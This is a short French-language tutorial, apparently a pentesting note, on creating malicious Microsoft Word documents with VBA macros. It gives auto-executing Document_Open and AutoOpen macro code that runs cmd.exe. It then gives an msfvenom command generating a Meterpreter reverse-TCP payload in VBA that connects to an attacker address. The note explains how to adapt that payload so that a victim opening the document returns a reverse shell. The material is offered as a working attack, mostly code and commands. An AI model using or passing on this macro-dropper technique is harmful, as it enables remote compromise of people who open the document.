VBA (Visual Basic for Applications), un langage de programmation mis en œuvre par Microsoft pour les applications telles que Microsoft Word, Excel, PowerPoint, etc... pour automatiser les tâches de presque toutes les interactions clavier et souris entre un utilisateur et les applications Microsoft Office.

---
#### Microsoft Word Macro
Utilise des macros pour créer des documents Microsoft malveillants:

1. Créez un nouveau document Microsoft vierge pour créer notre première `macro` .

2. Modifiez maintenant le document Word et créez une fonction macro qui exécute un `cmd.exe`  ou tout fichier exécutable,  

3. Afin d'exécuter pour automatiquement le code VBA une fois le document ouvert, nous pouvons utiliser des fonctions intégrées telles que  `AutoOpen`  et  `Document_open` . 

```javascript
Sub Document_Open()
  PoC
End Sub

Sub AutoOpen()
  PoC
End Sub

Sub PoC()
	Dim payload As String
	payload = "cmd.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

4. Il est important de noter que pour que la macro fonctionne, nous devons la sauvegarder au format _Macro-Enabled_ tel que` .doc` et  `docm` . 

5. Enregistrons maintenant le fichier en tant que modèle **`Document Word 97-2003`**


> [!NOTE] Bon a savoir
Nous pouvons combiner les VBA avec des méthodes telles que les HTA et WSH. Les VBA/macros en eux-mêmes ne contournent pas intrinsèquement les détections.

---
Créons maintenant une charge utile Meterpreter en mémoire à l'aide du framework Metasploit pour recevoir un shell inversé.

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.128 LPORT=443 -f vba
```

NB: *Une modification doit être effectuée pour que cela fonctionne.*

> Le résultat fonctionnera sur une feuille MS Excel. Par conséquent, remplacez  `Workbook_Open()` par  `Document_Open()` pour le rendre adapté aux documents MS Word.
> 
> Une fois le document MS Word malveillant ouvert sur la machine victime, nous devrions recevoir un shell inversé.
